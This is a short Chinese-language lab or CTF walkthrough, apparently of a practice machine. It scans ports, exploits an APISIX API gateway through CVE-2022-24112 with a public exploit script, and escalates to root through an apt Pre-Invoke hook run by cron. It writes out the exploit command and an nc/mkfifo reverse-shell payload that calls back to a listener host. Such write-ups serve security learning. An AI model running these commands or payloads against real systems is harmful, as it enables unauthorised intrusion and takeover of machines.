nmap 結果
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
9443/tcp  open  tungsten-https
43500/tcp open  unknown
```

連上他的網站功能都沒有用 他有一個留言板發送也會發送失敗
![image](https://hackmd.io/_uploads/ByPjDgbYye.png)

他有一個 43500 port 去連線 會回傳 json 資料 感覺很像什麼 api 
![image](https://hackmd.io/_uploads/SybVte-Kkg.png)

所以去看看他的 response header 發現到他用的 server 版本
![image](https://hackmd.io/_uploads/rJQUKxWYJl.png)

上網去找有沒有 payload 找到一個 RCE 雖然版本不同 但因為是更新的所以可以兼容 [CVE:2022-24112](https://www.exploit-db.com/exploits/50829)

本地起監聽並且執行這個 script
```
python3 50829.py http://192.168.110.220:43500/ 192.168.45.198 443
```

成功連進去並拿到 user flag
![image](https://hackmd.io/_uploads/HJP2--ZY1x.png)

放了 linpeas 後首先看到 sudo 版本為 1.8.31 想到之前有一個
![image](https://hackmd.io/_uploads/r1kT7W-Fye.png)

有一個 [CVE-2021-3156](https://github.com/worawit/CVE-2021-3156) 可以使用，但用了後他被 patched 掉了
```
try exploit_nss.py first
If an error is not glibc tcache related, you can try exploit_timestamp_race.c next
```

之後在 linpeas 有看到 `/etc/apt/apt.conf.d` 
![image](https://hackmd.io/_uploads/Hy6B4WWF1x.png)

上網查有找到一個可以使用的[漏洞](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation)

原理主要是透過 裡頭的 apt 會在 cron 裡頭重複執行 可以去這裡查看 `cat /etc/crontab`
![image](https://hackmd.io/_uploads/S1dMSW-tye.png)

先本地架監聽後使用裡面的 payload
```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.198 1234 >/tmp/f"};' > pwn
```

成功提權並拿到 root
![image](https://hackmd.io/_uploads/Sy_JUW-YJg.png)

小知識 如果畫面出現這樣 > 代表是單雙引號沒有閉合所以可以用以下指令把他閉合
```
' d04d04
' d04d04
'
"
```
![image](https://hackmd.io/_uploads/By5mL--FJe.png)
